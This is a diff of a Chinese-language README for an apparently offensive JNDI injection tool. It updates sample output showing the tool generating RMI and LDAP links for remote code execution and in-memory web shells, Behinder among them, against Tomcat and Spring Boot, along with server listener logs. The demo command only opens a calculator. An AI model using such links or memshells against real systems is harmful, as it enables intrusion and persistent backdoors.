@@ -16,30 +16,33 @@ JNDI注入利用工具，生成JNDI链接并启动后端相关服务，可用于
 ```shell
 $ java -jar JNDI-Injection-Memshell-1.0-SNAPSHOT-all.jar          
 [ADDRESS] >> 127.0.0.1
-[COMMAND] >> open /Applications/Calculator.app
+[COMMAND] >> open -a Calculator
 ----------------------------JNDI Links----------------------------
-Target environment(Build in JDK whose trustURLCodebase is false and have Tomcat 8+ or SpringBoot 1.2.x+ in classpath):
-rmi://127.0.0.1:1099/cl2cgx
-Target environment(Build in JDK 1.8 whose trustURLCodebase is true):
-rmi://127.0.0.1:1099/knlbmx
-ldap://127.0.0.1:1389/knlbmx
-Target environment(Tomcat Servlet Memshell):
-rmi://127.0.0.1:1099/9tc7hk
-ldap://127.0.0.1:1389/9tc7hk
-Target environment(Build in JDK 1.7 whose trustURLCodebase is true):
-rmi://127.0.0.1:1099/ma0np7
-ldap://127.0.0.1:1389/ma0np7
-Target environment(Springboot Interceptor Memshell):
-rmi://127.0.0.1:1099/fnijcn
-ldap://127.0.0.1:1389/fnijcn
 Target environment(Behinder Servlet Memshell):
-rmi://127.0.0.1:1099/oeczn8
-ldap://127.0.0.1:1389/oeczn8
+rmi://127.0.0.1:1099/j3zha7
+ldap://127.0.0.1:1389/j3zha7
+Target environment(Build in JDK 1.7 whose trustURLCodebase is true):
+rmi://127.0.0.1:1099/qrxwmq
+ldap://127.0.0.1:1389/qrxwmq
+Target environment(Springboot Interceptor Memshell):
+rmi://127.0.0.1:1099/i7ukcl
+ldap://127.0.0.1:1389/i7ukcl
+Target environment(Springboot Interceptor Behinder Memshell):
+rmi://127.0.0.1:1099/wxzn7u
+ldap://127.0.0.1:1389/wxzn7u
+Target environment(Build in JDK 1.8 whose trustURLCodebase is true):
+rmi://127.0.0.1:1099/hrrq2s
+ldap://127.0.0.1:1389/hrrq2s
+Target environment(Build in JDK whose trustURLCodebase is false and have Tomcat 8+ or SpringBoot 1.2.x+ in classpath):
+rmi://127.0.0.1:1099/djodn7
+Target environment(Tomcat Servlet Memshell):
+rmi://127.0.0.1:1099/xmw45d
+ldap://127.0.0.1:1389/xmw45d
 
 ----------------------------Server Log----------------------------
-2023-08-28 09:06:01 [JETTYSERVER]>> Listening on 0.0.0.0:8180
-2023-08-28 09:06:01 [RMISERVER]  >> Listening on 0.0.0.0:1099
-2023-08-28 09:06:01 [LDAPSERVER] >> Listening on 0.0.0.0:1389
+2023-08-28 15:04:30 [JETTYSERVER]>> Listening on 0.0.0.0:8180
+2023-08-28 15:04:30 [RMISERVER]  >> Listening on 0.0.0.0:1099
+2023-08-28 15:04:30 [LDAPSERVER] >> Listening on 0.0.0.0:1389
 ```
 
 - Tomcat Servlet Memshell
